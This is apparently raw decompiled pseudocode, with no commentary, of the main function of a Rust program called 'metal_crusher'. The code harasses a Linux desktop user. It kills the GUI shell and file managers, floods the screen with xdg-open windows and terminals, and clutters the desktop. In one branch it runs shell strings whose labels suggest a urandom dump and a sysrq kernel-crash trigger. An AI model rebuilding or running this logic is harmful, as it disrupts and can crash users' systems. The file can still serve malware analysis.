__int64 metal_crusher::main()
{
  __int64 v0; // rbx
  __int64 v1; // r14
  __int64 v2; // rdx
  __int64 v3; // rsi
  char i; // r12
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // r8
  __int64 v10; // r9
  __int64 v11; // rax
  __int64 v12; // rdx
  __int64 v13; // rcx
  __int64 v14; // r8
  __int64 v15; // r9
  __int64 v16; // rdx
  __int64 v17; // rcx
  __int64 v18; // r8
  __int64 v19; // r9
  __int64 v20; // rsi
  __int64 v21; // rdx
  __int64 v22; // rcx
  __int64 v23; // r8
  __int64 v24; // r9
  __int64 v25; // rax
  __int64 v26; // rdx
  __int64 v27; // rcx
  __int64 v28; // r8
  __int64 v29; // r9
  __int64 v30; // rdx
  __int64 v31; // rcx
  __int64 v32; // r8
  __int64 v33; // r9
  int v34; // ebx
  __int64 v35; // rsi
  __int64 v36; // rdx
  __int64 v37; // rcx
  __int64 v38; // r8
  __int64 v39; // r9
  __int64 v40; // rax
  __int64 v41; // rdx
  __int64 v42; // rcx
  __int64 v43; // r8
  __int64 v44; // r9
  int v45; // ebx
  __int64 v46; // rdx
  __int64 v47; // rcx
  __int64 v48; // r8
  __int64 v49; // r9
  __int64 v50; // rdx
  __int64 v51; // rcx
  __int64 v52; // r8
  __int64 v53; // r9
  char v54; // dl
  __int64 v55; // rdx
  __int64 v56; // rcx
  __int64 v57; // r8
  __int64 v58; // r9
  char v59; // dl
  __int64 v60; // rdx
  __int64 v61; // rcx
  __int64 v62; // r8
  __int64 v63; // r9
  __int128 v65; // [rsp+0h] [rbp-268h] BYREF
  unsigned __int128 v66; // [rsp+10h] [rbp-258h]
  __int128 v67; // [rsp+20h] [rbp-248h]
  const char *v68; // [rsp+30h] [rbp-238h]
  __int64 v69; // [rsp+38h] [rbp-230h]
  const char *v70; // [rsp+40h] [rbp-228h]
  __int64 v71; // [rsp+48h] [rbp-220h]
  __int64 v72; // [rsp+50h] [rbp-218h]
  __int64 v73; // [rsp+58h] [rbp-210h]
  const char *v74; // [rsp+60h] [rbp-208h] BYREF
  __int64 v75; // [rsp+68h] [rbp-200h]
  _BYTE v76[48]; // [rsp+70h] [rbp-1F8h] BYREF
  __int64 v77; // [rsp+A0h] [rbp-1C8h] BYREF
  char v78; // [rsp+A8h] [rbp-1C0h]
  __int128 v79; // [rsp+B0h] [rbp-1B8h] BYREF
  unsigned __int128 v80; // [rsp+C0h] [rbp-1A8h]
  __int128 v81; // [rsp+D0h] [rbp-198h]
  __int128 v82; // [rsp+E0h] [rbp-188h] BYREF
  __int64 v83; // [rsp+F0h] [rbp-178h]
  __int64 v84; // [rsp+F8h] [rbp-170h] BYREF
  char v85; // [rsp+100h] [rbp-168h]
  _BYTE v86[24]; // [rsp+108h] [rbp-160h] BYREF
  _BYTE v87[8]; // [rsp+120h] [rbp-148h] BYREF
  __int64 v88; // [rsp+128h] [rbp-140h]
  __int64 v89; // [rsp+130h] [rbp-138h]
  _QWORD v90[2]; // [rsp+138h] [rbp-130h] BYREF
  _BYTE v91[40]; // [rsp+148h] [rbp-120h] BYREF
  int v92; // [rsp+170h] [rbp-F8h] BYREF
  _BYTE v93[40]; // [rsp+178h] [rbp-F0h] BYREF
  __int128 v94; // [rsp+1A0h] [rbp-C8h] BYREF
  __int64 v95; // [rsp+1B0h] [rbp-B8h]
  __int128 v96; // [rsp+1B8h] [rbp-B0h] BYREF
  __int64 v97; // [rsp+1C8h] [rbp-A0h]
  _BYTE v98[24]; // [rsp+1D0h] [rbp-98h] BYREF
  __int128 v99; // [rsp+1E8h] [rbp-80h] BYREF
  __int64 v100; // [rsp+1F8h] [rbp-70h]
  __int128 v101; // [rsp+210h] [rbp-58h] BYREF
  _BYTE v102[72]; // [rsp+220h] [rbp-48h] BYREF

  std::env::args(&v65);
  core::iter::traits::iterator::Iterator::collect(v87, &v65);
  v0 = v88;
  v1 = v89;
  <T as alloc::slice::<impl [T]>::to_vec_in::ConvertVec>::to_vec(&v65);
  *(_QWORD *)&v76[16] = v66;
  *(_OWORD *)v76 = v65;
  core::result::Result<T,E>::unwrap(&v92, v76);
  if ( (unsigned __int8)<T as core::slice::cmp::SliceContains>::slice_contains(&v92, v0, v1) )
  {
    core::ptr::drop_in_place<alloc::string::String>(&v92);
    std::thread::sleep(108LL, 0LL);
    metal_crusher::fun::execute_shell((__int64)aCatDevUrandomA, 24LL);
    std::thread::sleep(1LL, 0LL);
    metal_crusher::fun::execute_shell((__int64)aEchoCProcSysrq, 28LL);
  }
  else
  {
    core::ptr::drop_in_place<alloc::string::String>(&v92);
    *(_QWORD *)&v80 = 0x8000000000000000LL;
    *(_QWORD *)&v79 = 0LL;
    BYTE8(v81) = 0;
    *(_QWORD *)&v67 = v81;
    BYTE8(v67) = 0;
    *(_DWORD *)((char *)&v67 + 9) = *(_DWORD *)((char *)&v81 + 9);
    *(_WORD *)((char *)&v67 + 13) = *(_WORD *)((char *)&v81 + 13);
    HIBYTE(v67) = HIBYTE(v81);
    v66 = __PAIR128__(*((unsigned __int64 *)&v80 + 1), 0x8000000000000000LL);
    v65 = v79;
    ((void (__fastcall *)(_BYTE *, __int128 *))std::thread::Builder::spawn_unchecked)(v76, &v65);
    core::result::Result<T,E>::expect(&v65, v76);
    core::ptr::drop_in_place<std::thread::JoinHandle<()>>(&v65);
    metal_crusher::music::play_audio();
    metal_crusher::fun::notify((__int64)aFunThingsWillH, 27LL, (__int64)aD_1, 2LL);
    std::thread::sleep(1LL, 0LL);
    metal_crusher::fun::notify((__int64)aFunThingsWillH, 27LL, (__int64)aD_1, 2LL);
    std::thread::sleep(0LL, 400000000LL);
    v74 = metal_crusher::fun::detect_terminal();
    v75 = v2;
    v3 = 300000000LL;
    std::thread::sleep(2LL, 300000000LL);
    for ( i = 1; ; i = 0 )
    {
      *(_QWORD *)&v65 = aXdgOpen_0;
      *((_QWORD *)&v65 + 1) = 10LL;
      *(_QWORD *)&v66 = aXdgOpenBin;
      *((_QWORD *)&v66 + 1) = 13LL;
      *(_QWORD *)&v67 = aXdgOpenLib;
      *((_QWORD *)&v67 + 1) = 13LL;
      v68 = aXdgOpenHome;
      v69 = 14LL;
      v70 = aXdgOpenTmp;
      v71 = 13LL;
      v72 = 0LL;
      v73 = 5LL;
      while ( 1 )
      {
        v5 = ((__int64 (__fastcall *)(__int128 *))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(&v65);
        if ( !v5 )
          break;
        metal_crusher::fun::execute_shell(v5, v6);
        v3 = 600000000LL;
        std::thread::sleep(0LL, 600000000LL);
      }
      ((void (__fastcall *)(__int128 *))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(&v65);
      *(_QWORD *)&v65 = aLsSleep2000;
      *((_QWORD *)&v65 + 1) = 16LL;
      *(_QWORD *)&v66 = aLsTmpSleep2000;
      *((_QWORD *)&v66 + 1) = 19LL;
      *(_QWORD *)&v67 = aLsBinSleep2000;
      *((_QWORD *)&v67 + 1) = 19LL;
      v68 = aLsUsrSleep2000;
      v69 = 19LL;
      v70 = aLsEtcSleep2000;
      v71 = 19LL;
      v72 = 0LL;
      v73 = 5LL;
      while ( 1 )
      {
        v11 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v65,
                v3,
                v7,
                v8,
                v9,
                v10);
        if ( !v11 )
          break;
        metal_crusher::fun::run_in_terminal((__int64)v74, v75, v11, v12);
        v3 = 600000000LL;
        std::thread::sleep(0LL, 600000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v65,
        v3,
        v12,
        v13,
        v14,
        v15);
      metal_crusher::fun::destroy_gui_shell(
        &v65,
        v3,
        v16,
        v17,
        v18,
        v19,
        v65,
        *((_QWORD *)&v65 + 1),
        v66,
        *((_QWORD *)&v66 + 1),
        v67,
        *((_QWORD *)&v67 + 1));
      metal_crusher::fun::destroy_file_managers();
      *(_QWORD *)v76 = &v74;
      *(_QWORD *)&v76[8] = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)&v65 = &off_597680;
      *((_QWORD *)&v65 + 1) = 1LL;
      *(_QWORD *)&v67 = 0LL;
      *(_QWORD *)&v66 = v76;
      *((_QWORD *)&v66 + 1) = 1LL;
      ((void (__fastcall *)(__int128 *, __int128 *))core::option::Option<T>::map_or_else)(&v94, &v65);
      v65 = v94;
      *(_QWORD *)&v66 = v95;
      metal_crusher::fun::execute_shell(*((__int64 *)&v94 + 1), v95);
      core::ptr::drop_in_place<alloc::string::String>(&v65);
      v20 = 200000000LL;
      std::thread::sleep(1LL, 200000000LL);
      metal_crusher::fun::reanimate_gui_shell();
      *(_QWORD *)&v65 = aXdgOpenDev;
      *((_QWORD *)&v65 + 1) = 13LL;
      *(_QWORD *)&v66 = aXdgOpenSbin;
      *((_QWORD *)&v66 + 1) = 14LL;
      *(_QWORD *)&v67 = aXdgOpenRun;
      *((_QWORD *)&v67 + 1) = 13LL;
      v68 = aXdgOpenSys;
      v69 = 13LL;
      v70 = aXdgOpenProc;
      v71 = 14LL;
      v72 = 0LL;
      v73 = 5LL;
      while ( 1 )
      {
        v25 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v65,
                v20,
                v21,
                v22,
                v23,
                v24);
        if ( !v25 )
          break;
        metal_crusher::fun::execute_shell(v25, v26);
        v20 = 600000000LL;
        std::thread::sleep(0LL, 600000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v65,
        v20,
        v26,
        v27,
        v28,
        v29);
      metal_crusher::fun::run_in_terminal((__int64)v74, v75, (__int64)aTreeHomeSleep2, 22LL);
      std::thread::sleep(0LL, 600000000LL);
      v34 = 4;
      while ( --v34 )
      {
        metal_crusher::fun::run_in_terminal((__int64)v74, v75, (__int64)aPsAuxSleep2000, 18LL);
        std::thread::sleep(0LL, 600000000LL);
      }
      *(_QWORD *)v76 = &v74;
      *(_QWORD *)&v76[8] = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)&v65 = &off_597680;
      *((_QWORD *)&v65 + 1) = 1LL;
      *(_QWORD *)&v67 = 0LL;
      *(_QWORD *)&v66 = v76;
      *((_QWORD *)&v66 + 1) = 1LL;
      ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
        &v96,
        &v65,
        v30,
        v31,
        v32,
        v33);
      v65 = v96;
      *(_QWORD *)&v66 = v97;
      metal_crusher::fun::execute_shell(*((__int64 *)&v96 + 1), v97);
      core::ptr::drop_in_place<alloc::string::String>(&v65);
      std::thread::sleep(1LL, 200000000LL);
      metal_crusher::fun::destroy_file_managers();
      v35 = 0LL;
      std::thread::sleep(2LL, 0LL);
      ((void (*)(void))metal_crusher::fun::toggle_desktop_overview)();
      metal_crusher::fun::put_random_shit_on_desktop();
      ((void (*)(void))metal_crusher::fun::toggle_desktop_overview)();
      *(_QWORD *)&v65 = aXdgOpenHttpsWw;
      *((_QWORD *)&v65 + 1) = 40LL;
      *(_QWORD *)&v66 = aXdgOpenHttpsWw_0;
      *((_QWORD *)&v66 + 1) = 46LL;
      *(_QWORD *)&v67 = aXdgOpenHttps2i;
      *((_QWORD *)&v67 + 1) = 23LL;
      v68 = aXdgOpenHttpsGi;
      v69 = 56LL;
      v70 = aXdgOpenHttpsWw_1;
      v71 = 56LL;
      v72 = 0LL;
      v73 = 5LL;
      while ( 1 )
      {
        v40 = ((__int64 (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))<core::array::iter::IntoIter<T,_> as core::iter::traits::iterator::Iterator>::next)(
                &v65,
                v35,
                v36,
                v37,
                v38,
                v39);
        if ( !v40 )
          break;
        metal_crusher::fun::execute_shell(v40, v41);
        metal_crusher::fun::execute_shell(1LL, 0LL);
        v35 = 500000000LL;
        std::thread::sleep(1LL, 500000000LL);
      }
      ((void (__fastcall *)(__int128 *, __int64, __int64, __int64, __int64, __int64))core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>)(
        &v65,
        v35,
        v41,
        v42,
        v43,
        v44);
      std::thread::sleep(0LL, 500000000LL);
      v45 = 8;
      while ( --v45 )
      {
        std::thread::sleep(0LL, 200000000LL);
        metal_crusher::fun::toggle_desktop_overview(
          0LL,
          200000000LL,
          v46,
          v47,
          v48,
          v49,
          v65,
          *((_QWORD *)&v65 + 1),
          v66,
          *((_QWORD *)&v66 + 1),
          v67,
          *((_QWORD *)&v67 + 1));
      }
      if ( (i & 1) == 0 )
        break;
      v3 = 500000000LL;
      std::thread::sleep(3LL, 500000000LL);
    }
    std::env::var(&v65, aUser, 4LL);
    ((void (__fastcall *)(_BYTE *, __int128 *))core::result::Result<T,E>::unwrap)(v98, &v65);
    v67 = v81;
    v66 = v80;
    v65 = v79;
    ((void (__fastcall *)(_BYTE *, __int128 *))std::thread::Builder::spawn_unchecked)(v76, &v65);
    core::result::Result<T,E>::expect(&v65, v76);
    core::ptr::drop_in_place<std::thread::JoinHandle<()>>(&v65);
    std::thread::Builder::spawn_unchecked(&v65, &v79);
    core::result::Result<T,E>::expect(v76, &v65);
    core::ptr::drop_in_place<std::thread::JoinHandle<()>>(v76);
    *(_QWORD *)v76 = v98;
    *(_QWORD *)&v76[8] = <alloc::string::String as core::fmt::Display>::fmt;
    *(_QWORD *)&v65 = &off_597690;
    *((_QWORD *)&v65 + 1) = 1LL;
    *(_QWORD *)&v67 = 0LL;
    *(_QWORD *)&v66 = v76;
    *((_QWORD *)&v66 + 1) = 1LL;
    ((void (__fastcall *)(_BYTE *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
      v102,
      &v65,
      v50,
      v51,
      v52,
      v53);
    std::fs::read_dir(&v65, v102);
    v77 = core::result::Result<T,E>::unwrap(v65, DWORD2(v65), &off_5976E0);
    v78 = v54 & 1;
    while ( 1 )
    {
      <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next(&v92, &v77);
      if ( v92 != 1 )
        break;
      core::result::Result<T,E>::unwrap(v91, v93, &off_5976F8);
      std::fs::DirEntry::file_type(&v65, v91);
      if ( (core::result::Result<T,E>::unwrap(&v65, &off_597710) & 0xF000) == 0x4000 )
      {
        std::fs::DirEntry::path(v76, v91);
        *(_OWORD *)v86 = *(_OWORD *)&v76[8];
        *(_QWORD *)&v82 = v86;
        *((_QWORD *)&v82 + 1) = <std::path::Display as core::fmt::Display>::fmt;
        *(_QWORD *)&v65 = &off_5976A0;
        *((_QWORD *)&v65 + 1) = 1LL;
        *(_QWORD *)&v67 = 0LL;
        *(_QWORD *)&v66 = &v82;
        *((_QWORD *)&v66 + 1) = 1LL;
        ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
          &v99,
          &v65,
          v55,
          v56,
          v57,
          v58);
        core::ptr::drop_in_place<std::path::PathBuf>(v76);
        v65 = v99;
        *(_QWORD *)&v66 = v100;
        metal_crusher::fun::execute_shell(*((__int64 *)&v99 + 1), v100);
        core::ptr::drop_in_place<alloc::string::String>(&v65);
        std::fs::DirEntry::path(&v65, v91);
        std::fs::read_dir(v76, &v65);
        v84 = core::result::Result<T,E>::unwrap(*(_QWORD *)v76, *(unsigned int *)&v76[8], &off_597728);
        v85 = v59 & 1;
        while ( 1 )
        {
          <std::fs::ReadDir as core::iter::traits::iterator::Iterator>::next(v76, &v84);
          if ( *(_DWORD *)v76 != 1 )
            break;
          core::result::Result<T,E>::unwrap(&v99, &v76[8], &off_597740);
          std::fs::DirEntry::file_type(&v65, &v99);
          if ( (core::result::Result<T,E>::unwrap(&v65, &off_597758) & 0xF000) == 0x4000 )
          {
            std::fs::DirEntry::path(v86, &v99);
            v101 = *(_OWORD *)&v86[8];
            v90[0] = &v101;
            v90[1] = <std::path::Display as core::fmt::Display>::fmt;
            *(_QWORD *)&v65 = &off_5976A0;
            *((_QWORD *)&v65 + 1) = 1LL;
            *(_QWORD *)&v67 = 0LL;
            *(_QWORD *)&v66 = v90;
            *((_QWORD *)&v66 + 1) = 1LL;
            ((void (__fastcall *)(__int128 *, __int128 *, __int64, __int64, __int64, __int64))core::option::Option<T>::map_or_else)(
              &v82,
              &v65,
              v60,
              v61,
              v62,
              v63);
            core::ptr::drop_in_place<std::path::PathBuf>(v86);
            v65 = v82;
            *(_QWORD *)&v66 = v83;
            metal_crusher::fun::execute_shell(*((__int64 *)&v82 + 1), v83);
            core::ptr::drop_in_place<alloc::string::String>(&v65);
            std::thread::sleep(0LL, 400000000LL);
            ((void (*)(void))metal_crusher::fun::toggle_desktop_overview)();
          }
          core::ptr::drop_in_place<std::fs::DirEntry>(&v99);
        }
        core::ptr::drop_in_place<std::fs::ReadDir>(&v84);
        ((void (*)(void))metal_crusher::fun::toggle_desktop_overview)();
        std::thread::sleep(0LL, 400000000LL);
      }
      core::ptr::drop_in_place<std::fs::DirEntry>(v91);
    }
    core::ptr::drop_in_place<std::fs::ReadDir>(&v77);
    std::thread::sleep(40LL, 0LL);
    core::ptr::drop_in_place<alloc::string::String>(v98);
  }
  return core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v87);
}